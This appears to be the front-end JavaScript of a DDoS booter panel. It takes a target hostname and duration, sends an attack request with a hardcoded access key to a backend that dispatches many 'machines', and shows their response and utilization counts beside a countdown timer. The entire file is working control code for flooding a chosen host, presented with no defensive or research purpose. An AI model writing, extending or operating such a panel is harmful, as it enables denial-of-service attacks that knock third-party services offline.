
window.pageAuthLoadedHandler = async function () {



    await get("machines/count").then(async (ret) => {
        machinecount = parseInt(ret)
        $("#machineCount").html(`<i class="fa fa-globe" aria-hidden="true"></i>Available machines : ${ret} `)
    })
    $(".loading").hide()
    $(".wrapper").show()



}

let attacks = null

async function sendAttack() {
    $("#triggerFinger").prop("disabled", true);
    let host = ($("#hostnameForm").val())
    let attackTime = ($("#attackTimeForm").val())
    let method = ($("#methodForm").val())
    method = "97ae0e0c0fd1fc7616e4ef2e190de65f"

    attackId = CryptoJS.MD5(makeid(getRandomInt(9, 20))).toString()

    attacks.push({
        userid: user.uid,
        init: Date.now(),
        method: method,
        host: host,
        attackLength: attackTime,
        attackId: attackId,
        ends: (Date.now() + (parseInt(attackTime) * 1000))
    })
    localStorage.setItem("attacks", JSON.stringify({attacks: attacks}))
    await get(`all/attack/${method}/${host}/${attackTime}/${attackId}`,
        {
            headers: {
                'accesskey': "foobar"
            }
        }).then(async (ret) => {
            console.log(ret);
            $(".form-control").prop({ disabled: true })
            $("#afterCarrier").fadeIn(500, function () {
                $("#askedMachines").fadeIn(250, function () {
                    $("#respondedMachines").fadeIn(250, function () {
                        $("#busyMachines").fadeIn(250, function () {
                            $("#utilizationMachines").fadeIn(250, function () {

                            })
                        })
                    })
                })
            })
            $("#askedMachinesCount").html(ret.asked)
            $("#respondedMachinesCount").html(ret.responded)
            $("#busyMachinesCount").html(ret.data.busy.length)
            $("#utilizationMachinesCount").html(`${(ret.asked / machinecount) * 100}%`)
            console.log(ret.asked / machinecount);
            startTimer(parseInt(attackTime)); // 4 minutes in seconds
            toastr.success("Attack has started.")
        })

}

if (localStorage.getItem("timerSecs")) {
    let xx = JSON.parse(localStorage.getItem("timerSecs"))
    if (Date.now() > (xx.at + (xx.for * 1000))) {
        console.log("timer past");
        localStorage.removeItem("timerSecs")
    } else {
        startTimer(xx.remaining)

    }
}

if (localStorage.getItem("attacks")) {
    attacks = JSON.parse(localStorage.getItem("attacks")).attacks
} else {
    localStorage.setItem("attacks", JSON.stringify({attacks: []}))
    attacks = JSON.parse(localStorage.getItem("attacks")).attacks
}

$(".loading").show()
$(".wrapper").hide()
$("#askedMachines").hide()
$("#respondedMachines").hide()
$("#afterCarrier").hide()
$("#busyMachines").hide()
$("#utilizationMachines").hide()

let machinecount = 0
let attackId = null
var key = null
var iv = null
var text = null
var decryptedWA = null
var userid = null

function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
}


var timeInSecs;
var ticker;

function startTimer(secs) {
    timeInSecs = parseInt(secs);
    ticker = setInterval("tick()", 1000);
}

function tick() {
    console.log(localStorage.getItem("timerSecs"));
    var secs = timeInSecs;
    if (localStorage.getItem("timerSecs")) {
        let xx = JSON.parse(localStorage.getItem("timerSecs"))
        xx.remaining = secs
        localStorage.setItem("timerSecs", JSON.stringify(xx));
    } else {
        localStorage.setItem("timerSecs", JSON.stringify({ at: Date.now(), remaining: secs, for: secs }));
    }
    if (secs > 0) {
        timeInSecs--;
    }
    else {
        $("#triggerFinger").html(`Complete`)
        console.log("complete");
        toastr.success("Attack is complete.")
        localStorage.removeItem("timerSecs")
        clearInterval(ticker);
        return
    }

    var mins = Math.floor(secs / 60);
    secs %= 60;
    var pretty = ((mins < 10) ? "0" : "") + mins + ":" + ((secs < 10) ? "0" : "") + secs;

    $("#triggerFinger").html(`${pretty} Left`)
}